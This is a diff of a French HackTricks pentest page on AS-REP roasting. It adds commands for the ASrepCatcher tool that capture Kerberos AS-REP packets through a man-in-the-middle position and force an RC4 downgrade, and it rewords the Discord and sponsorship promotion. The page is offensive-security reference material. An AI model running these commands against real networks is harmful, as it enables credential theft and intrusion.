@@ -22,7 +22,7 @@ Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSb
 Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
 
 **Actualités de piratage en temps réel**\
-Restez à jour avec le monde du piratage rapide grâce aux actualités et aux informations en temps réel
+Restez informé du monde du piratage en évolution rapide grâce à des actualités et des informations en temps réel
 
 **Dernières annonces**\
 Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
@@ -94,6 +94,19 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 {% endcode %}
 
+## ASreproast sans identifiants
+Sans la connaissance des utilisateurs qui ne nécessitent pas d'authentification préalable Kerberos. Un attaquant peut utiliser une position d'homme du milieu pour capturer les paquets AS-REP lorsqu'ils traversent le réseau.<br>
+[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) nous permet de le faire. De plus, l'outil <ins>force les postes de travail clients à utiliser RC4</ins> en modifiant la négociation Kerberos.
+```bash
+# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
+ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
+
+# Disabling ARP spoofing, the mitm position must be obtained differently
+ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+
+# Passive listening of AS-REP packets, no packet alteration
+ASrepCatcher.py listen
+```
 ## Références
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
@@ -104,24 +117,24 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de primes en bugs !
 
-**Perspectives de piratage**\
-Engagez-vous avec du contenu qui explore le frisson et les défis du piratage
+**Perspectives de Hacking**\
+Engagez-vous avec du contenu qui explore les sensations et les défis du hacking
 
-**Actualités de piratage en temps réel**\
-Restez à jour avec le monde du piratage en évolution rapide grâce aux actualités et aux informations en temps réel
+**Actualités de Hacking en Temps Réel**\
+Restez à jour avec le monde du hacking en évolution rapide grâce aux actualités et aux informations en temps réel
 
-**Dernières annonces**\
+**Dernières Annonces**\
 Restez informé des dernières primes de bugs lancées et des mises à jour cruciales de la plateforme
 
-**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui !
+**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui!
 
 <details>
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
